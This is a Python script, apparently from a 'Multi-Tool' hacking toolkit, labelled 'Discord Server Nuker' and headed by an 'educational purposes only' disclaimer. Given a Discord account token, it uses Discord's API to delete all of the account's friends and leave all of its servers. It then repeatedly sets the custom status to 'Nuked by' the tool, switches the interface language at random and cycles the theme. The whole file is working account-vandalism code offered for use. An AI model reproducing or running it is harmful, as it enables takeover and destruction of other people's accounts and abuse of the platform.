# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import random
    from itertools import cycle
except Exception as e:
    MissingModule(e)

Title("Discord Server Nuker")
Connection()

try:
    token      = ChoiceToken()
    new_status = input(f"{INPUT} Custom Status {red}->{reset} ")

    try:
        loop_count = int(input(f"{INPUT} Number of Loops {red}->{reset} "))
    except:
        ErrorNumber()

    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}

    default_status = f"Nuked by {name_tool} | {github_url}"
    custom_status  = f"{new_status} | {name_tool}"

    themes_cycle = cycle(["dark", "light"])

    def RemoveFriends(token, headers):
        try:
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            for friend in friends:
                if friend.get("type") == 1: 
                    friend_id = friend["id"]
                    response = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}", headers=headers)
                    if response.status_code == 204:
                        print(f"{SUCCESS} Status:{red} Deleted {white}| Friend Id:{red} {friend_id}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| Friend Id:{red} {friend_id}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Friend Id:{red} {friend_id}", reset)

    def LeaveServers(token, headers):
        try:
            guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            for guild in guilds:
                guild_id = guild["id"]
                response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
                if response.status_code == 204:
                    print(f"{SUCCESS} Status:{red} Deleted {white}| Server Id:{red} {guild_id}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Server Id:{red} {guild_id}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Server Id:{red} {guild_id}", reset)

    RemoveFriends(token, headers)
    LeaveServers(token, headers)

    for _ in range(loop_count):
        custom_status_default = {"custom_status": {"text": default_status}}
        try:
            response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=custom_status_default)
            if response.status_code == 200:
                print(f"{SUCCESS} Status:{red} Changed {white}| Custom Status:{red} {default_status}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Custom Status:{red} {default_status}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Custom Status:{red} {default_status}", reset)

        for _ in range(5):
            try:
                random_language = random.choice(["zh", "ar", "ja", "ko", "ru"])
                data            = {'locale': random_language}

                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=data)
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Language:{red} {random_language}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Language:{red} {random_language}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Language:{red} {random_language}", reset)

            try:
                themes = next(themes_cycle)
                data   = {'theme': themes}

                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=data)
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Theme:{red} {themes}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Theme:{red} {themes}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Theme:{red} {themes}", reset)

        custom_status_custom = {"custom_status": {"text": custom_status}}
        try:
            response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=custom_status_custom)
            if response.status_code == 200:
                print(f"{SUCCESS} Status:{red} Changed {white}| Custom Status:{red} {custom_status}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Custom Status:{red} {custom_status}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Custom Status:{red} {custom_status}", reset)

        for _ in range(5):
            try:
                random_language = random.choice(["zh", "ar", "ja", "ko", "ru"])
                data            = {'locale': random_language}

                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=data)
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Language:{red} {random_language}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Language:{red} {random_language}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Language:{red} {random_language}", reset)

            try:
                themes = next(themes_cycle)
                data   = {'theme': themes}

                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=data)
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Theme:{red} {themes}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Theme:{red} {themes}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Theme:{red} {themes}", reset)
            time.sleep(0.33)

    Continue()
    Reset()

except Exception as e:
    Error(e)